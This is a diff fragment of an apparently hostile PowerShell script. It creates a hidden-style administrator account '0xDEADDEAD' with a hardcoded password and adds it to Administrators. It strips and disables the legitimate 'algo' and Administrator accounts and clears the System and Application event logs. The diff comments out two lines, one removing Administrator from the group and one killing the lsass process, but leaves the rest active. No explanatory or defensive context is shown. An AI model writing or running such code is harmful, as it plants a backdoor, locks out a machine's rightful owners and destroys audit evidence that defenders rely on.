@@ -19,11 +19,11 @@ $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
 New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
 Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
 Remove-LocalGroupMember -Group "Administrators" -Member "algo"
-Remove-LocalGroupMember -Group "Administrators" -Member "Administrator"
+#Remove-LocalGroupMember -Group "Administrators" -Member "Administrator"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
 
-Stop-Process -Name "lsass" -ErrorAction Ignore
+#Stop-Process -Name "lsass" -ErrorAction Ignore
 
 Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
